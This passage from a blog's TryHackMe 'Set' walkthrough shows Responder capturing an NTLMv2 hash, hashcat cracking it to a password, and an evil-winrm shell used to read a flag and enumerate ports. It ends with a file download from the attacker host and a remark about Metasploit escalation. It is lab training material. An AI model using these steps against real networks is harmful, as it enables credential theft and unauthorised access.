script hit CTRL-C<br><br><br>[+] Poisoners:<br>    LLMNR                      [ON]<br>    NBT-NS                     [ON]<br>    DNS/MDNS                   [ON]<br><br>[+] Servers:<br>    HTTP server                [ON]<br>    HTTPS server               [ON]<br>    WPAD proxy                 [OFF]<br>    Auth proxy                 [OFF]<br>    SMB server                 [ON]<br>    Kerberos server            [ON]<br>    SQL server                 [ON]<br>    FTP server                 [ON]<br>    IMAP server                [ON]<br>    POP3 server                [ON]<br>    SMTP server                [ON]<br>    DNS server                 [ON]<br>    LDAP server                [ON]<br>    RDP server                 [ON]<br>    DCE-RPC server             [ON]<br>    WinRM server               [ON]<br><br>[+] HTTP Options:<br>    Always serving EXE         [OFF]<br>    Serving EXE                [OFF]<br>    Serving HTML               [OFF]<br>    Upstream Proxy             [OFF]<br><br>[+] Poisoning Options:<br>    Analyze Mode               [OFF]<br>    Force WPAD auth            [OFF]<br>    Force Basic Auth           [OFF]<br>    Force LM downgrade         [OFF]<br>    Fingerprint hosts          [OFF]<br><br>[+] Generic Options:<br>    Responder NIC              [tun0]<br>    Responder IP               [10.14.24.91]<br>    Challenge <span class="hljs-built_in">set</span>              [random]<br>    Don<span class="hljs-string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="hljs-string">&#x27;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Current Session Variables:</span><br><span class="hljs-string">    Responder Machine Name     [WIN-NI64PA3536E]</span><br><span class="hljs-string">    Responder Domain Name      [UVE2.LOCAL]</span><br><span class="hljs-string">    Responder DCE-RPC Port     [47181]</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Listening for events...</span><br><span class="hljs-string"></span><br><span class="hljs-string">[SMB] NTLMv2-SSP Client   : 10.10.1.212</span><br><span class="hljs-string">[SMB] NTLMv2-SSP Username : SET\MichelleWat</span><br><span class="hljs-string">[SMB] NTLMv2-SSP Hash     : MichelleWat::SET:a36eb66d04b51e9b:C237F9BC6DF4DD690FB84B57720ECE7F:0101000000000000006B32317294D80170F8288F20385AC90000000002000800550056004500320001001E00570049004E002D004E00490036003400500041003300350033003600450004003400570049004E002D004E0049003600340050004100330035003300360045002E0055005600450032002E004C004F00430041004C000300140055005600450032002E004C004F00430041004C000500140055005600450032002E004C004F00430041004C0007000800006B32317294D8010600040002000000080030003000000000000000000000000020000027863830992798E29095FC4731C521AFF10CDBF6EFBB6E9F8E9B66BC5F8CCA260A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310034002E00320034002E00390031000000000000000000</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hashcat -m 5600 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt<br>MICHELLEWAT::SET:a36eb66d04b51e9b:c237f9bc6df4dd690fb84b57720ece7f:0101000000000000006b32317294d80170f8288f20385ac90000000002000800550056004500320001001e00570049004e002d004e00490036003400500041003300350033003600450004003400570049004e002d004e0049003600340050004100330035003300360045002e0055005600450032002e004c004f00430041004c000300140055005600450032002e004c004f00430041004c000500140055005600450032002e004c004f00430041004c0007000800006b32317294d8010600040002000000080030003000000000000000000000000020000027863830992798e29095fc4731c521aff10cdbf6efbb6e9f8e9b66bc5f8cca260a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310034002e00320034002e00390031000000000000000000:!!!MICKEYmouse<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">1.212</span> <span class="hljs-literal">-u</span> MichelleWat <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;!!!MICKEYmouse&#x27;</span><br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">4</span><br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is</span> <span class="hljs-title">unimplemented</span> <span class="hljs-title">on</span> <span class="hljs-title">this</span> <span class="hljs-title">machine</span></span><br><br><span class="hljs-keyword">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil<span class="hljs-literal">-WinRM</span> Github: https://github.com/Hackplayers/evil<span class="hljs-literal">-winrm</span><span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\MichelleWat\Documents&gt; <span class="hljs-built_in">ls</span><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\MichelleWat\Documents&gt; <span class="hljs-built_in">cd</span> ../desktop<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\MichelleWat\desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\MichelleWat\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br><span class="hljs-literal">-a----</span>        <span class="hljs-number">6</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">2</span>:<span class="hljs-number">07</span> PM             <span class="hljs-number">52</span> Flag2.txt<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\MichelleWat\desktop&gt; <span class="hljs-built_in">cat</span> <span class="hljs-string">&quot;Flag2.txt&quot;</span><br>Flag2: THM&#123;<span class="hljs-number">690</span>......................................&#125;<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\MichelleWat\desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<h6 id="Flag3-txt"><a href="#Flag3-txt" class="headerlink" title="Flag3.txt:"></a>Flag3.txt:</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\MichelleWat\desktop&gt; netstat <span class="hljs-literal">-ao</span><br><br>Active Connections<br><br>  Proto  Local Address          Foreign Address        State           PID<br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">80</span>             <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">135</span>            <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">988</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">443</span>            <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">445</span>            <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2805</span>           <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">2780</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">3389</span>           <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">868</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">5985</span>           <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">47001</span>          <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">49664</span>          <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">704</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">49665</span>          <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">1092</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">49666</span>          <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">860</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">49667</span>          <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">796</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">49669</span>          <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">1612</span><br>  TCP    <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">49670</span>          <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">780</span><br>  TCP    <span class="hljs-number">10.10</span>.<span class="hljs-number">1.212</span>:<span class="hljs-number">139</span>        <span class="hljs-built_in">SET</span>:<span class="hljs-number">0</span>                  LISTENING       <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">10.10</span>.<span class="hljs-number">1.212</span>:<span class="hljs-number">2805</span>       <span class="hljs-built_in">SET</span>:<span class="hljs-number">49714</span>              ESTABLISHED     <span class="hljs-number">2780</span><br>  TCP    <span class="hljs-number">10.10</span>.<span class="hljs-number">1.212</span>:<span class="hljs-number">5985</span>       ip<span class="hljs-literal">-10-14-24-91</span>:<span class="hljs-number">47866</span>   TIME_WAIT       <span class="hljs-number">0</span><br>  TCP    <span class="hljs-number">10.10</span>.<span class="hljs-number">1.212</span>:<span class="hljs-number">5985</span>       ip<span class="hljs-literal">-10-14-24-91</span>:<span class="hljs-number">47882</span>   ESTABLISHED     <span class="hljs-number">4</span><br>  TCP    <span class="hljs-number">10.10</span>.<span class="hljs-number">1.212</span>:<span class="hljs-number">49714</span>      <span class="hljs-built_in">SET</span>:<span class="hljs-number">2805</span>               ESTABLISHED     <span class="hljs-number">2780</span><br>  TCP    <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">2805</span>         <span class="hljs-built_in">SET</span>:<span class="hljs-number">49715</span>              ESTABLISHED     <span class="hljs-number">2780</span><br>  TCP    <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">2805</span>         <span class="hljs-built_in">SET</span>:<span class="hljs-number">49725</span>              ESTABLISHED     <span class="hljs-number">2780</span><br>  TCP    <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">2805</span>         <span class="hljs-built_in">SET</span>:<span class="hljs-number">49729</span>              ESTABLISHED     <span class="hljs-number">2780</span><br>  TCP    <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">49715</span>        <span class="hljs-built_in">SET</span>:<span class="hljs-number">2805</span>               ESTABLISHED     <span class="hljs-number">2780</span><br>  TCP    <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">49725</span>        <span class="hljs-built_in">SET</span>:<span class="hljs-number">2805</span>               ESTABLISHED     <span class="hljs-number">2780</span><br>  TCP    <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">49729</span>        <span class="hljs-built_in">SET</span>:<span class="hljs-number">2805</span>               ESTABLISHED     <span class="hljs-number">2780</span><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\MichelleWat\desktop&gt; <span class="hljs-built_in">Get-Process</span> <span class="hljs-literal">-Id</span> <span class="hljs-number">2780</span><br><br>Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="hljs-built_in">SI</span> ProcessName<br><span class="hljs-literal">-------</span>  <span class="hljs-literal">------</span>    <span class="hljs-literal">-----</span>      <span class="hljs-literal">-----</span>     <span class="hljs-literal">------</span>     <span class="hljs-literal">--</span>  <span class="hljs-literal">--</span> <span class="hljs-literal">-----------</span><br>    <span class="hljs-number">705</span>      <span class="hljs-number">53</span>    <span class="hljs-number">54696</span>      <span class="hljs-number">73560</span>              <span class="hljs-number">2780</span>   <span class="hljs-number">0</span> Veeam.One.Agent.Service<br><br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\MichelleWat\desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo python -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.159.234 - - [10/Jul/2022 17:13:58] <span class="hljs-string">&quot;GET /putty.exe HTTP/1.1&quot;</span> 200 -<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\MichelleWat\Desktop&gt; wget http://10.14.24.91/putty.exe -O putty.exe<br>*Evil-WinRM* PS C:\Users\MichelleWat\Desktop&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\MichelleWat\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        6/16/2020   2:07 PM             52 Flag2.txt<br>-a----        7/10/2022   2:14 AM        1449256 putty.exe<br></code></pre></td></tr></table></figure>
+
+<p>最后一个flag发现了一些BUG半天没弄好，将2805端口转发出去然后用MSF一键利用提权。不记录了。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Active-Directory/">#Active Directory</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TryHackMe-Set</div>
+      <div>http://example.com/2022/10/06/TryHackMe-Set/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Mosaic Theory</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/TryHackMe-Ra/" title="TryHackMe-Ra">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">TryHackMe-Ra</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/Tryhackme-Game-Zone/" title="Tryhackme-Game Zone">
+                        <span class="hidden-mobile">Tryhackme-Game Zone</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
